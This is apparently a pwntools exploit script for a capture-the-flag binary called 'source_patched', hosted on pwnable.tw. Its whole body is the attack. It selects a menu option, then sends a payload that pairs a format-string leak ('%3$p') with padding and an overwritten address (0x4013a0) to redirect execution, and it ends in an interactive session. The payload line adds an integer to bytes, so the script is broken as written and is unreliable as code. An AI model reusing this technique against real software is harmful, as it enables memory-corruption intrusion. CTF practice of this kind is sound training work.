#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("source_patched")
libc = ELF("./libc.so.6")

local = True 
if local:
    p = process("./source_patched")
    gdb.attach(p,'''b*0x40140b\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./source_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

sla(b"Your option:", str(4))

other = 0x4013a0
payload = b"%3$p" + b"a"*(47-4) + 8 + p64(other) 
sa(b"Enter, the book, that you want to read", payload)

p.interactive()